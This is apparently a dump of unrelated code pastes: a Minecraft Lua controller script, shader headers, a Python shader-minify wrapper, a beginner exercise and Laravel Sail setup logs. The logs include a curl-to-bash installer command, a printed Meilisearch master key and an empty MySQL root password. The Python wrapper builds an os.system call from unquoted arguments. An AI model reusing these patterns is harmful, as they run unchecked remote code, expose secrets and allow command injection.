speedControllersWater = {peripheral.wrap(""Create_RotationSpeedController_1""),
	peripheral.wrap(""Create_RotationSpeedController_2""),
	peripheral.wrap(""Create_RotationSpeedController_0""),
	peripheral.wrap(""Create_RotationSpeedController_3""),
	peripheral.wrap(""Create_RotationSpeedController_4""),
	peripheral.wrap(""Create_RotationSpeedController_5"")}

speedControllersLava = {peripheral.wrap(""Create_RotationSpeedController_9""),
	peripheral.wrap(""Create_RotationSpeedController_10""),
	peripheral.wrap(""Create_RotationSpeedController_11""),
	peripheral.wrap(""Create_RotationSpeedController_12""),
	peripheral.wrap(""Create_RotationSpeedController_13""),
	peripheral.wrap(""Create_RotationSpeedController_14"")}

clutchOutput = ""top""


lavaOff = 0.000000001
lavaLow = 24
lavaOn  = 128

waterOff = 0.000000001
waterLow = 32
waterOn  = 128

monitor.setBackgroundColor(colors.black)
monitor.clear()
 
function loop()
    --loop
    monitor.setTextColor(colors.white)
	monitor.setBackgroundColor(colors.lightGray)
    monitor.setCursorPos(1,1)
    monitor.write(""Engine:       : 1 2 3 4 5 6"")
    monitor.setCursorPos(1,2)
	monitor.setBackgroundColor(colors.lightBlue)
    monitor.write(""WaterOff      :  | | | | | "")
    monitor.setCursorPos(1,3)
    monitor.write(""WaterLow      :  | | | | | "")
    monitor.setCursorPos(1,4)
    monitor.write(""WaterHigh     :  | | | | | "")
    monitor.setCursorPos(1,5)
	monitor.setBackgroundColor(colors.orange)
    monitor.write(""LavaOff       :  | | | | | "")
    monitor.setCursorPos(1,6)
    monitor.write(""LavaLow       :  | | | | | "")
    monitor.setCursorPos(1,7)
    monitor.write(""LavaHigh      :  | | | | | "")
    monitor.setCursorPos(1,8)
	monitor.setBackgroundColor(colors.green)
    monitor.write(""EnableOutput               "")
    monitor.setCursorPos(1,9)
	monitor.setBackgroundColor(colors.red)
    monitor.write(""DisableOutput              "")
end
 
 
    
function generalUpdate()
    while true do
        loop()
        sleep(0.01)
    end
end
 
function respondMonitorTouched()
    while true do
        event, side, xPos, yPos = os.pullEvent(""monitor_touch"")
        if xPos >= 17 and xPos <= 28 then
            i_engine = math.floor((xPos-15)/2)
            print(i_engine)
            if yPos == 2 then
                speedControllersWater[i_engine].setTargetSpeed(waterOff)
            end
            if yPos == 3 then
                speedControllersWater[i_engine].setTargetSpeed(waterLow)
            end
            if yPos == 4 then
                speedControllersWater[i_engine].setTargetSpeed(waterOn)
            end
            if yPos == 5 then
                speedControllersLava[i_engine].setTargetSpeed(lavaOff)
            end
            if yPos == 6 then
                speedControllersLava[i_engine].setTargetSpeed(lavaLow)
            end
            if yPos == 7 then
                speedControllersLava[i_engine].setTargetSpeed(lavaOn)
            end
		end
        if yPos == 8 then
        	redstone.setOutput(clutchOutput,true)
        end
        if yPos == 9 then
            redstone.setOutput(clutchOutput,false)
        end
    end
end
sleep(15)
parallel.waitForAny(respondMonitorTouched,generalUpdate)"
QP3fjjjt,shaders_release.h as of 2024-01-19,Kitomas,C,Friday 19th of January 2024 03:27:26 AM CDT,"// Generated with Shader Minifier 1.3.6 (https://github.com/laurentlb/Shader_Minifier/)
#ifndef SHADERS_RELEASE_H_
# define SHADERS_RELEASE_H_
# define VAR_color ""n""
# define VAR_position ""v""

const char *testfrag_glsl =
 ""#version 330 core\n""
 ""layout(location=0) out vec4 n;""
 ""void main()""
 ""{""
   ""n=vec4(1,0,1,1);""
 ""}"";

const char *testvert_glsl =
 ""#version 330 core\n""
 ""layout(location=0) in vec4 v;""
 ""void main()""
 ""{""
   ""gl_Position=v;""
 ""}"";

#endif // SHADERS_RELEASE_H_
"
WgyZdUM0,shaders_debug.h as of 2024-01-19,Kitomas,C,Friday 19th of January 2024 03:25:38 AM CDT,"// Generated with Shader Minifier 1.3.6 (https://github.com/laurentlb/Shader_Minifier/)
#ifndef SHADERS_DEBUG_H_
# define SHADERS_DEBUG_H_

const char *testfrag_glsl =
 ""#version 330 core\n""
 ""layout(location=0) out vec4 color;""
 ""void main()""
 ""{""
   ""color=vec4(1,0,1,1);""
 ""}"";

const char *testvert_glsl =
 ""#version 330 core\n""
 ""layout(location=0) in vec4 position;""
 ""void main()""
 ""{""
   ""gl_Position=position;""
 ""}"";

#endif // SHADERS_DEBUG_H_
"
r4exa6xG,shaders.hpp as of 2024-01-19,Kitomas,C++,Friday 19th of January 2024 03:24:30 AM CDT,"#ifndef _SHADERS_H
#define _SHADERS_H




#ifdef _DEBUG
# define VAR_color ""color""
# define VAR_position ""position""

#include ""shaders_debug.h""
#else
#include ""shaders_release.h""
#endif /* _DEBUG */




#endif /* _SHADERS_H */
"
bnW6kHbZ,minifyShaders.py as of 2024-01-19,Kitomas,Python,Friday 19th of January 2024 03:21:32 AM CDT,"#!/usr/bin/env python3
if __name__ != ""__main__"": exit(0)
from time import time
from os import walk as folderIterate, system as cmd
from os.path import isdir, exists, join as pathJoin
from sys import argv

#1st argument is one of these build modes
#2nd argument is the output file name
#the rest are input file names
build_modes = {
    ""-release"" : """",
    ""-debug""   : ""--no-renaming""
}


def getFilesInFolderRecursively(rootIn):
    paths = ''
    if not exists(rootIn): return None
    if not isdir(rootIn): return False
    for root, dirs, files in folderIterate(rootIn,topdown=True):
        for fi in files:
            paths += pathJoin(root,fi)+' '
    return paths


if len(argv) < 4: exit()

if not argv[1].lower() in build_modes:
    print(""Error: \""{}\"" is not a valid build mode!"".format(argv[1]))
    exit(1)

flags, paths  =  build_modes[argv[1]], ''

#(starting at 3 because argv[2] is the OUTPUT file, not input)
for i in range(3,len(argv)):
    paths += getFilesInFolderRecursively(argv[i])
    
    if type(paths) == bool:
        print(""Error: \""{}\"" is a file, not a folder!"".format(argv[i]))
        exit(1)
    elif paths == None:
        print(""Error: \""{}\"" does not exist!"".format(argv[i]))
        exit(1)
    elif type(paths) != str:
        print(""Error: paths returned unknown type"")
        exit(1)
    
if paths != '':
    cmd(""shader_minifier.exe {} -o {} {}"".format(flags, argv[2], paths))
    "
2XWraJ8d,7,raya_petkovaa,Python,Friday 19th of January 2024 02:39:01 AM CDT,"fuel_type = input()
fuel_litres_in_tank = float(input())
 
if fuel_type not in ('Diesel', 'Gasoline', 'Gas'):
    print(f'Invalid fuel!')
else:
    if fuel_litres_in_tank >= 25:
        print(f'You have enough {fuel_type.lower()}.')
    else:
        print(f'Fill your tank with {fuel_type.lower()}!')"
TibkKTgz,sail_up,smartcomputing123,Bash,Friday 19th of January 2024 02:12:07 AM CDT,"user@MSI:~/example-app$ ./vendor/bin/sail up
[+] Building 0.0s (0/0)                                                                                  docker:default
[+] Running 10/9
 ✔ Network example-app_sail               Created                                                                  0.1s
 ✔ Volume ""example-app_sail-mysql""        Created                                                                  0.0s
 ✔ Volume ""example-app_sail-redis""        Created                                                                  0.0s
 ✔ Volume ""example-app_sail-meilisearch""  Created                                                                  0.0s
 ✔ Container example-app-meilisearch-1    Created                                                                  0.1s
 ✔ Container example-app-redis-1          Created                                                                  0.1s
 ✔ Container example-app-selenium-1       Created                                                                  0.1s
 ✔ Container example-app-mailpit-1        Created                                                                  0.1s
 ✔ Container example-app-mysql-1          Created                                                                  0.1s
 ✔ Container example-app-laravel.test-1   Created                                                                  0.0s
Attaching to example-app-laravel.test-1, example-app-mailpit-1, example-app-meilisearch-1, example-app-mysql-1, example-app-redis-1, example-app-selenium-1
example-app-selenium-1      | 2024-01-17 05:01:19,942 INFO Included extra file ""/etc/supervisor/conf.d/selenium.conf"" during parsing
example-app-selenium-1      | 2024-01-17 05:01:19,947 INFO RPC interface 'supervisor' initialized
example-app-selenium-1      | 2024-01-17 05:01:19,948 CRIT Server 'unix_http_server' running without any HTTP authentication checking
example-app-selenium-1      | 2024-01-17 05:01:19,948 INFO supervisord started with pid 8
example-app-mailpit-1       | INFO[2024/01/17 05:01:19] [smtpd] starting on [::]:1025
example-app-mailpit-1       | INFO[2024/01/17 05:01:19] [http] starting on [::]:8025
example-app-mailpit-1       | INFO[2024/01/17 05:01:19] [http] accessible via http://localhost:8025/
example-app-redis-1         | 1:C 17 Jan 2024 05:01:20.376 # WARNING Memory overcommit must be enabled! Without it, a background save or replication may fail under low memory condition. Being disabled, it can also cause failures without low memory condition, see https://github.com/jemalloc/jemalloc/issues/1328. To fix this issue add 'vm.overcommit_memory = 1' to /etc/sysctl.conf and then reboot or run the command 'sysctl vm.overcommit_memory=1' for this to take effect.
example-app-redis-1         | 1:C 17 Jan 2024 05:01:20.376 * oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo
example-app-redis-1         | 1:C 17 Jan 2024 05:01:20.376 * Redis version=7.2.4, bits=64, commit=00000000, modified=0, pid=1, just started
example-app-redis-1         | 1:C 17 Jan 2024 05:01:20.376 # Warning: no config file specified, using the default config. In order to specify a config file use redis-server /path/to/redis.conf
example-app-redis-1         | 1:M 17 Jan 2024 05:01:20.377 * monotonic clock: POSIX clock_gettime
example-app-redis-1         | 1:M 17 Jan 2024 05:01:20.377 * Running mode=standalone, port=6379.
example-app-redis-1         | 1:M 17 Jan 2024 05:01:20.378 * Server initialized
example-app-redis-1         | 1:M 17 Jan 2024 05:01:20.378 * Ready to accept connections tcp
example-app-mysql-1         | [Entrypoint] MySQL Docker Image 8.0.32-1.2.11-server
example-app-mysql-1         | [Entrypoint] Initializing database
example-app-mysql-1         | 2024-01-17T05:01:20.561452Z 0 [Warning] [MY-011068] [Server] The syntax '--skip-host-cache' is deprecated and will be removed in a future release. Please use SET GLOBAL host_cache_size=0 instead.
example-app-mysql-1         | 2024-01-17T05:01:20.561511Z 0 [System] [MY-013169] [Server] /usr/sbin/mysqld (mysqld 8.0.32) initializing of server in progress as process 17
example-app-mysql-1         | 2024-01-17T05:01:20.568037Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started.
example-app-selenium-1      | 2024-01-17 05:01:20,951 INFO spawned: 'xvfb' with pid 9
example-app-selenium-1      | 2024-01-17 05:01:20,953 INFO spawned: 'vnc' with pid 10
example-app-selenium-1      | 2024-01-17 05:01:20,954 INFO spawned: 'novnc' with pid 11
example-app-selenium-1      | 2024-01-17 05:01:20,956 INFO spawned: 'selenium-standalone' with pid 12
example-app-selenium-1      | Setting up SE_NODE_GRID_URL...
example-app-selenium-1      | 2024-01-17 05:01:20,961 INFO success: xvfb entered RUNNING state, process has stayed up for > than 0 seconds (startsecs)
example-app-selenium-1      | 2024-01-17 05:01:20,961 INFO success: vnc entered RUNNING state, process has stayed up for > than 0 seconds (startsecs)
example-app-selenium-1      | 2024-01-17 05:01:20,961 INFO success: novnc entered RUNNING state, process has stayed up for > than 0 seconds (startsecs)
example-app-selenium-1      | 2024-01-17 05:01:20,961 INFO success: selenium-standalone entered RUNNING state, process has stayed up for > than 0 seconds (startsecs)
example-app-selenium-1      | Selenium Grid Standalone configuration:
example-app-selenium-1      | [network]
example-app-selenium-1      | relax-checks = true
example-app-selenium-1      |
example-app-selenium-1      | [node]
example-app-selenium-1      | session-timeout = ""300""
example-app-selenium-1      | override-max-sessions = false
example-app-selenium-1      | detect-drivers = false
example-app-selenium-1      | drain-after-session-count = 0
example-app-selenium-1      | max-sessions = 1
example-app-selenium-1      |
example-app-selenium-1      | [[node.driver-configuration]]
example-app-selenium-1      | display-name = ""chrome""
example-app-selenium-1      | stereotype = '{""browserName"": ""chrome"", ""browserVersion"": ""120.0"", ""platformName"": ""Linux"", ""goog:chromeOptions"": {""binary"": ""/usr/bin/google-chrome""}}'
example-app-selenium-1      | max-sessions = 1
example-app-selenium-1      |
example-app-selenium-1      | Starting Selenium Grid Standalone...
example-app-selenium-1      | Tracing is disabled
example-app-laravel.test-1  | 2024-01-17 05:01:21,337 INFO Set uid to user 0 succeeded
example-app-laravel.test-1  | 2024-01-17 05:01:21,339 INFO supervisord started with pid 1
example-app-selenium-1      | 05:01:21.488 INFO [LoggingOptions.configureLogEncoding] - Using the system default encoding
example-app-selenium-1      | 05:01:21.497 INFO [OpenTelemetryTracer.createTracer] - Using OpenTelemetry for tracing
example-app-mysql-1         | 2024-01-17T05:01:21.568051Z 1 [System] [MY-013577] [InnoDB] InnoDB initialization has ended.
example-app-meilisearch-1   |
example-app-meilisearch-1   | 888b     d888          d8b 888 d8b                                            888
example-app-meilisearch-1   | 8888b   d8888          Y8P 888 Y8P                                            888
example-app-meilisearch-1   | 88888b.d88888              888                                                888
example-app-meilisearch-1   | 888Y88888P888  .d88b.  888 888 888 .d8888b   .d88b.   8888b.  888d888 .d8888b 88888b.
example-app-meilisearch-1   | 888 Y888P 888 d8P  Y8b 888 888 888 88K      d8P  Y8b     ""88b 888P""  d88P""    888 ""88b
example-app-meilisearch-1   | 888  Y8P  888 88888888 888 888 888 ""Y8888b. 88888888 .d888888 888    888      888  888
example-app-meilisearch-1   | 888   ""   888 Y8b.     888 888 888      X88 Y8b.     888  888 888    Y88b.    888  888
example-app-meilisearch-1   | 888       888  ""Y8888  888 888 888  88888P'  ""Y8888  ""Y888888 888     ""Y8888P 888  888
example-app-meilisearch-1   |
example-app-meilisearch-1   | Config file path: ""none""
example-app-meilisearch-1   | Database path:            ""./data.ms""
example-app-meilisearch-1   | Server listening on:      ""http://0.0.0.0:7700""
example-app-meilisearch-1   | Environment:              ""development""
example-app-meilisearch-1   | Commit SHA:               ""a6fa0b97ecb5ac75ee0e180a956e4a066eda5f39""
example-app-meilisearch-1   | Commit date:              ""2024-01-15T09:37:31+00:00""
example-app-meilisearch-1   | Package version:  ""1.6.0""
example-app-meilisearch-1   |
example-app-meilisearch-1   | Thank you for using Meilisearch!
example-app-meilisearch-1   |
example-app-meilisearch-1   |
example-app-meilisearch-1   | We collect anonymized analytics to improve our product and your experience. To learn more, including how to turn off analytics, visit our dedicated documentation page: https://www.meilisearch.com/docs/learn/what_is_meilisearch/telemetry
example-app-meilisearch-1   |
example-app-meilisearch-1   | Anonymous telemetry:      ""Enabled""
example-app-meilisearch-1   | Instance UID:             ""e8bd85a7-82cb-4884-890e-843888405127""
example-app-meilisearch-1   |
example-app-meilisearch-1   |
example-app-meilisearch-1   |
example-app-meilisearch-1   |  No master key was found. The server will accept unidentified requests.
example-app-meilisearch-1   |
example-app-meilisearch-1   |  A master key of at least 16 bytes will be required when switching to a production environment.
example-app-meilisearch-1   |
example-app-meilisearch-1   |
example-app-meilisearch-1   | We generated a new secure master key for you (you can safely use this token):
example-app-meilisearch-1   |
example-app-meilisearch-1   | >> --master-key YrGhkiXfe3vHBeDazaxriT8DW-3EoTlyI3irKvAXlYw <<
example-app-meilisearch-1   |
example-app-meilisearch-1   | Restart Meilisearch with the argument above to use this new and secure master key.
example-app-meilisearch-1   |
example-app-meilisearch-1   | Check out Meilisearch Cloud!      https://www.meilisearch.com/cloud?utm_campaign=oss&utm_source=engine&utm_medium=cli
example-app-meilisearch-1   | Documentation:                    https://www.meilisearch.com/docs
example-app-meilisearch-1   | Source code:                      https://github.com/meilisearch/meilisearch
example-app-meilisearch-1   | Discord:                  https://discord.meilisearch.com
example-app-meilisearch-1   |
example-app-meilisearch-1   | [2024-01-17T05:01:21Z INFO  actix_server::builder] starting 10 workers
example-app-meilisearch-1   | [2024-01-17T05:01:21Z INFO  actix_server::server] Actix runtime found; starting in Actix runtime
example-app-selenium-1      | 05:01:22.263 INFO [NodeOptions.getSessionFactories] - Detected 20 available processors
example-app-selenium-1      | 05:01:22.292 INFO [NodeOptions.report] - Adding chrome for {""browserName"": ""chrome"",""browserVersion"": ""120.0"",""goog:chromeOptions"": {""binary"": ""\u002fusr\u002fbin\u002fgoogle-chrome""},""platformName"": ""linux"",""se:noVncPort"": 7900,""se:vncEnabled"": true} 1 times
example-app-selenium-1      | 05:01:22.305 INFO [Node.<init>] - Binding additional locator mechanisms: relative
example-app-selenium-1      | 05:01:22.318 INFO [GridModel.setAvailability] - Switching Node 8fbda06e-e606-43c7-aac2-d0aa4e50b744 (uri: http://172.18.0.2:4444) from DOWN to UP
example-app-selenium-1      | 05:01:22.319 INFO [LocalDistributor.add] - Added node 8fbda06e-e606-43c7-aac2-d0aa4e50b744 at http://172.18.0.2:4444. Health check every 120s
example-app-laravel.test-1  | 2024-01-17 05:01:22,342 INFO spawned: 'php' with pid 16
example-app-selenium-1      | 05:01:22.566 INFO [Standalone.execute] - Started Selenium Standalone 4.16.1 (revision 9b4c83354e): http://172.18.0.2:4444
example-app-laravel.test-1  | 2024-01-17 05:01:23,344 INFO success: php entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
example-app-mysql-1         | 2024-01-17T05:01:23.373898Z 6 [Warning] [MY-010453] [Server] root@localhost is created with an empty password ! Please consider switching off the --initialize-insecure option.
example-app-laravel.test-1  |
example-app-laravel.test-1  |    INFO  Server running on [http://0.0.0.0:80].
example-app-laravel.test-1  |
example-app-laravel.test-1  |   Press Ctrl+C to stop the server
example-app-laravel.test-1  |
example-app-mysql-1         | [Entrypoint] Database initialized
example-app-mysql-1         | 2024-01-17T05:01:27.174660Z 0 [Warning] [MY-011068] [Server] The syntax '--skip-host-cache' is deprecated and will be removed in a future release. Please use SET GLOBAL host_cache_size=0 instead.
example-app-mysql-1         | 2024-01-17T05:01:27.176031Z 0 [System] [MY-010116] [Server] /usr/sbin/mysqld (mysqld 8.0.32) starting as process 60
example-app-mysql-1         | 2024-01-17T05:01:27.216550Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started.
example-app-mysql-1         | 2024-01-17T05:01:27.627325Z 1 [System] [MY-013577] [InnoDB] InnoDB initialization has ended.
example-app-mysql-1         | 2024-01-17T05:01:27.886488Z 0 [Warning] [MY-010068] [Server] CA certificate ca.pem is self signed.
example-app-mysql-1         | 2024-01-17T05:01:27.886522Z 0 [System] [MY-013602] [Server] Channel mysql_main configured to support TLS. Encrypted connections are now supported for this channel.
example-app-mysql-1         | 2024-01-17T05:01:27.901016Z 0 [System] [MY-011323] [Server] X Plugin ready for connections. Socket: /var/run/mysqld/mysqlx.sock
example-app-mysql-1         | 2024-01-17T05:01:27.903794Z 0 [System] [MY-010931] [Server] /usr/sbin/mysqld: ready for connections. Version: '8.0.32'  socket: '/var/lib/mysql/mysql.sock'  port: 0  MySQL Community Server - GPL.
example-app-mysql-1         | Warning: Unable to load '/usr/share/zoneinfo/iso3166.tab' as time zone. Skipping it.
example-app-mysql-1         | Warning: Unable to load '/usr/share/zoneinfo/leapseconds' as time zone. Skipping it.
example-app-mysql-1         | Warning: Unable to load '/usr/share/zoneinfo/tzdata.zi' as time zone. Skipping it.
example-app-mysql-1         | Warning: Unable to load '/usr/share/zoneinfo/zone.tab' as time zone. Skipping it.
example-app-mysql-1         | Warning: Unable to load '/usr/share/zoneinfo/zone1970.tab' as time zone. Skipping it.
example-app-mysql-1         |
example-app-mysql-1         | [Entrypoint] running /docker-entrypoint-initdb.d/10-create-testing-database.sh
example-app-mysql-1         | mysql: [Warning] Using a password on the command line interface can be insecure.
example-app-mysql-1         |
example-app-mysql-1         | 2024-01-17T05:01:29.182746Z 15 [System] [MY-013172] [Server] Received SHUTDOWN from user root. Shutting down mysqld (Version: 8.0.32).
example-app-mysql-1         | 2024-01-17T05:01:30.843522Z 0 [System] [MY-010910] [Server] /usr/sbin/mysqld: Shutdown complete (mysqld 8.0.32)  MySQL Community Server - GPL.
example-app-mysql-1         | [Entrypoint] Server shut down
example-app-mysql-1         |
example-app-mysql-1         | [Entrypoint] MySQL init process done. Ready for start up.
example-app-mysql-1         |
example-app-mysql-1         | [Entrypoint] Starting MySQL 8.0.32-1.2.11-server
example-app-mysql-1         | 2024-01-17T05:01:31.399090Z 0 [Warning] [MY-011068] [Server] The syntax '--skip-host-cache' is deprecated and will be removed in a future release. Please use SET GLOBAL host_cache_size=0 instead.
example-app-mysql-1         | 2024-01-17T05:01:31.400063Z 0 [System] [MY-010116] [Server] /usr/sbin/mysqld (mysqld 8.0.32) starting as process 1
example-app-mysql-1         | 2024-01-17T05:01:31.405284Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started.
example-app-mysql-1         | 2024-01-17T05:01:31.519698Z 1 [System] [MY-013577] [InnoDB] InnoDB initialization has ended.
example-app-mysql-1         | 2024-01-17T05:01:31.629835Z 0 [Warning] [MY-010068] [Server] CA certificate ca.pem is self signed.
example-app-mysql-1         | 2024-01-17T05:01:31.629869Z 0 [System] [MY-013602] [Server] Channel mysql_main configured to support TLS. Encrypted connections are now supported for this channel.
example-app-mysql-1         | 2024-01-17T05:01:31.643235Z 0 [System] [MY-011323] [Server] X Plugin ready for connections. Bind-address: '::' port: 33060, socket: /var/run/mysqld/mysqlx.sock
example-app-mysql-1         | 2024-01-17T05:01:31.643349Z 0 [System] [MY-010931] [Server] /usr/sbin/mysqld: ready for connections. Version: '8.0.32'  socket: '/var/lib/mysql/mysql.sock'  port: 3306  MySQL Community Server - GPL.
example-app-meilisearch-1   | [2024-01-17T05:01:50Z INFO  actix_web::middleware::logger] 127.0.0.1 ""GET /health HTTP/1.1"" 200 22 ""-"" ""Wget"" 0.000448
example-app-laravel.test-1  |   2024-01-17 05:01:55 ................................................... ~ 0s
example-app-laravel.test-1  |   2024-01-17 05:01:55 /favicon.ico ...................................... ~ 0s
example-app-meilisearch-1   | [2024-01-17T05:02:20Z INFO  actix_web::middleware::logger] 127.0.0.1 ""GET /health HTTP/1.1"" 200 22 ""-"" ""Wget"" 0.000119
example-app-meilisearch-1   | [2024-01-17T05:02:50Z INFO  actix_web::middleware::logger] 127.0.0.1 ""GET /health HTTP/1.1"" 200 22 ""-"" ""Wget"" 0.000098
example-app-meilisearch-1   | [2024-01-17T05:03:20Z INFO  actix_web::middleware::logger] 127.0.0.1 ""GET /health HTTP/1.1"" 200 22 ""-"" ""Wget"" 0.000169
example-app-meilisearch-1   | [2024-01-17T05:03:50Z INFO  actix_web::middleware::logger] 127.0.0.1 ""GET /health HTTP/1.1"" 200 22 ""-"" ""Wget"" 0.000105
example-app-meilisearch-1   | [2024-01-17T05:04:20Z INFO  actix_web::middleware::logger] 127.0.0.1 ""GET /health HTTP/1.1"" 200 22 ""-"" ""Wget"" 0.000127
example-app-meilisearch-1   | [2024-01-17T05:04:50Z INFO  actix_web::middleware::logger] 127.0.0.1 ""GET /health HTTP/1.1"" 200 22 ""-"" ""Wget"" 0.000157
example-app-meilisearch-1   | [2024-01-17T05:05:20Z INFO  actix_web::middleware::logger] 127.0.0.1 ""GET /health HTTP/1.1"" 200 22 ""-"" ""Wget"" 0.000106
"
t9EPkeL4,curl_s_laravel_build_example,smartcomputing123,Bash,Friday 19th of January 2024 02:09:15 AM CDT,"user@MSI:~$ curl -s https://laravel.build/example-app | bash
latest: Pulling from laravelsail/php83-composer
Digest: sha256:bf8d87c943cacab0e04ead85e8c1db440e345fd1456714f736786ef4d18ba7b7
Status: Image is up to date for laravelsail/php83-composer:latest
   WARN  TTY mode requires /dev/tty to be read/writable.

    Creating a ""laravel/laravel"" project at ""./example-app""
    Installing laravel/laravel (v10.3.2)
      - Downloading laravel/laravel (v10.3.2)
      - Installing laravel/laravel (v10.3.2): Extracting archive
    Created project in /opt/example-app
    > @php -r ""file_exists('.env') || copy('.env.example', '.env');""
    Loading composer repositories with package information
    Updating dependencies
    Lock file operations: 111 installs, 0 updates, 0 removals
      - Locking brick/math (0.11.0)
  - Locking carbonphp/carbon-doctrine-types (2.1.0)
  - Locking dflydev/dot-access-data (v3.0.2)
  - Locking doctrine/inflector (2.0.9)
  - Locking doctrine/lexer (3.0.0)
  - Locking dragonmantank/cron-expression (v3.3.3)
  - Locking egulias/email-validator (4.0.2)
      - Locking fakerphp/faker (v1.23.1)
  - Locking filp/whoops (2.15.4)
  - Locking fruitcake/php-cors (v1.3.0)
      - Locking graham-campbell/result-type (v1.1.2)
      - Locking guzzlehttp/guzzle (7.8.1)
      - Locking guzzlehttp/promises (2.0.2)
  - Locking guzzlehttp/psr7 (2.6.2)
  - Locking guzzlehttp/uri-template (v1.0.3)
  - Locking hamcrest/hamcrest-php (v2.0.1)
  - Locking laravel/framework (v10.41.0)
  - Locking laravel/pint (v1.13.9)
  - Locking laravel/prompts (v0.1.15)
  - Locking laravel/sail (v1.27.1)
  - Locking laravel/sanctum (v3.3.3)
  - Locking laravel/serializable-closure (v1.3.3)
  - Locking laravel/tinker (v2.9.0)
  - Locking league/commonmark (2.4.1)
  - Locking league/config (v1.2.0)
  - Locking league/flysystem (3.23.0)
  - Locking league/flysystem-local (3.23.0)
  - Locking league/mime-type-detection (1.14.0)
  - Locking mockery/mockery (1.6.7)
  - Locking monolog/monolog (3.5.0)
  - Locking myclabs/deep-copy (1.11.1)
  - Locking nesbot/carbon (2.72.1)
  - Locking nette/schema (v1.2.5)
  - Locking nette/utils (v4.0.3)
  - Locking nikic/php-parser (v5.0.0)
  - Locking nunomaduro/collision (v7.10.0)
  - Locking nunomaduro/termwind (v1.15.1)
  - Locking phar-io/manifest (2.0.3)
  - Locking phar-io/version (3.2.1)
  - Locking phpoption/phpoption (1.9.2)
  - Locking phpunit/php-code-coverage (10.1.11)
  - Locking phpunit/php-file-iterator (4.1.0)
      - Locking phpunit/php-invoker (4.0.0)
  - Locking phpunit/php-text-template (3.0.1)
  - Locking phpunit/php-timer (6.0.0)
  - Locking phpunit/phpunit (10.5.7)
      - Locking psr/clock (1.0.0)
      - Locking psr/container (2.0.2)
      - Locking psr/event-dispatcher (1.0.0)
      - Locking psr/http-client (1.0.3)
      - Locking psr/http-factory (1.0.2)
  - Locking psr/http-message (2.0)
  - Locking psr/log (3.0.0)
  - Locking psr/simple-cache (3.0.0)
  - Locking psy/psysh (v0.12.0)
  - Locking ralouphie/getallheaders (3.0.3)
  - Locking ramsey/collection (2.0.0)
  - Locking ramsey/uuid (4.7.5)
  - Locking sebastian/cli-parser (2.0.0)
  - Locking sebastian/code-unit (2.0.0)
  - Locking sebastian/code-unit-reverse-lookup (3.0.0)
  - Locking sebastian/comparator (5.0.1)
  - Locking sebastian/complexity (3.2.0)
  - Locking sebastian/diff (5.1.0)
  - Locking sebastian/environment (6.0.1)
  - Locking sebastian/exporter (5.1.1)
  - Locking sebastian/global-state (6.0.1)
  - Locking sebastian/lines-of-code (2.0.2)
  - Locking sebastian/object-enumerator (5.0.0)
  - Locking sebastian/object-reflector (3.0.0)
  - Locking sebastian/recursion-context (5.0.0)
  - Locking sebastian/type (4.0.0)
  - Locking sebastian/version (4.0.1)
  - Locking spatie/backtrace (1.5.3)
  - Locking spatie/flare-client-php (1.4.3)
  - Locking spatie/ignition (1.12.0)
  - Locking spatie/laravel-ignition (2.4.1)
  - Locking symfony/console (v6.4.2)
  - Locking symfony/css-selector (v7.0.0)
  - Locking symfony/deprecation-contracts (v3.4.0)
  - Locking symfony/error-handler (v6.4.0)
  - Locking symfony/event-dispatcher (v7.0.2)
  - Locking symfony/event-dispatcher-contracts (v3.4.0)
  - Locking symfony/finder (v6.4.0)
  - Locking symfony/http-foundation (v6.4.2)
  - Locking symfony/http-kernel (v6.4.2)
  - Locking symfony/mailer (v6.4.2)
  - Locking symfony/mime (v6.4.0)
  - Locking symfony/polyfill-ctype (v1.28.0)
      - Locking symfony/polyfill-intl-grapheme (v1.28.0)
  - Locking symfony/polyfill-intl-idn (v1.28.0)
  - Locking symfony/polyfill-intl-normalizer (v1.28.0)
  - Locking symfony/polyfill-mbstring (v1.28.0)
      - Locking symfony/polyfill-php72 (v1.28.0)
      - Locking symfony/polyfill-php80 (v1.28.0)
      - Locking symfony/polyfill-php83 (v1.28.0)
      - Locking symfony/polyfill-uuid (v1.28.0)
      - Locking symfony/process (v6.4.2)
  - Locking symfony/routing (v6.4.2)
  - Locking symfony/service-contracts (v3.4.1)
  - Locking symfony/string (v7.0.2)
  - Locking symfony/translation (v6.4.2)
  - Locking symfony/translation-contracts (v3.4.1)
  - Locking symfony/uid (v6.4.0)
  - Locking symfony/var-dumper (v6.4.2)
  - Locking symfony/yaml (v7.0.0)
  - Locking theseer/tokenizer (1.2.2)
  - Locking tijsverkoyen/css-to-inline-styles (v2.2.7)
  - Locking vlucas/phpdotenv (v5.6.0)
  - Locking voku/portable-ascii (2.0.1)
  - Locking webmozart/assert (1.11.0)
    Writing lock file
Installing dependencies from lock file (including require-dev)
    Package operations: 111 installs, 0 updates, 0 removals
      - Downloading doctrine/inflector (2.0.9)
      - Downloading doctrine/lexer (3.0.0)
      - Downloading webmozart/assert (1.11.0)
      - Downloading dragonmantank/cron-expression (v3.3.3)
      - Downloading fakerphp/faker (v1.23.1)
      - Downloading symfony/polyfill-php83 (v1.28.0)
      - Downloading symfony/http-foundation (v6.4.2)
      - Downloading fruitcake/php-cors (v1.3.0)
      - Downloading psr/http-message (2.0)
      - Downloading psr/http-client (1.0.3)
      - Downloading ralouphie/getallheaders (3.0.3)
      - Downloading psr/http-factory (1.0.2)
      - Downloading guzzlehttp/psr7 (2.6.2)
      - Downloading guzzlehttp/promises (2.0.2)
      - Downloading guzzlehttp/guzzle (7.8.1)
      - Downloading guzzlehttp/uri-template (v1.0.3)
      - Downloading laravel/pint (v1.13.9)
      - Downloading symfony/string (v7.0.2)
      - Downloading symfony/service-contracts (v3.4.1)
      - Downloading symfony/console (v6.4.2)
      - Downloading phpoption/phpoption (1.9.2)
      - Downloading graham-campbell/result-type (v1.1.2)
      - Downloading vlucas/phpdotenv (v5.6.0)
      - Downloading symfony/css-selector (v7.0.0)
      - Downloading tijsverkoyen/css-to-inline-styles (v2.2.7)
  - Downloading symfony/var-dumper (v6.4.2)
      - Downloading symfony/polyfill-uuid (v1.28.0)
      - Downloading symfony/uid (v6.4.0)
      - Downloading symfony/routing (v6.4.2)
      - Downloading symfony/process (v6.4.2)
      - Downloading symfony/polyfill-php72 (v1.28.0)
      - Downloading symfony/polyfill-intl-idn (v1.28.0)
      - Downloading symfony/mime (v6.4.0)
